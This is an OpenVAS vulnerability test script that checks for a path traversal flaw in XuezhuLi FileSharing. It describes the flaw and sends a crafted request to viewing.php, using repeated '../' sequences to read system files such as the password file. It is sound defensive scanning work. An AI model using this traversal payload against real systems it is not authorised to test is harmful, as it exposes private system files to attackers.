###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xuezhuli_filesharing_path_trav_vuln.nasl 11702 2018-10-01 07:31:38Z asteins $
#
# XuezhuLi FileSharing 'filename' Parameter Path Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:xuezhuLi:xuezhuli_filesharing";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808176");
  script_version("$Revision: 11702 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-01 09:31:38 +0200 (Mon, 01 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-06-27 12:52:04 +0530 (Mon, 27 Jun 2016)");
  script_name("XuezhuLi FileSharing 'filename' Parameter Path Traversal Vulnerability");

  script_tag(name:"summary", value:"The host is installed with XuezhuLi
  FileSharing and is prone to path traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and
  check whether it is able read password information.");

  script_tag(name:"insight", value:"The flaw exists due to an improper
  validation of user supplied input to 'file_name' parameter in 'download.php'
  and 'viewing.php' scripts.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files.");

  script_tag(name:"affected", value:"XuezhuLi FileSharing all versions");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/137609/xuezhulifilesharing-traversal.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_xuezhuli_filesharing_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("XuezhuLi/FileSharing/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!file_Port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:file_Port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
   url = dir + '/viewing.php?file_name=' + crap(data: "../", length: 3*15) + files[file];

   if( http_vuln_check( port:file_Port, url:url, check_header:TRUE, pattern:file ) )
   {
     report = report_vuln_url(port:file_Port, url:url);
     security_message(port:file_Port, data:report);
     exit(0);
   }
}
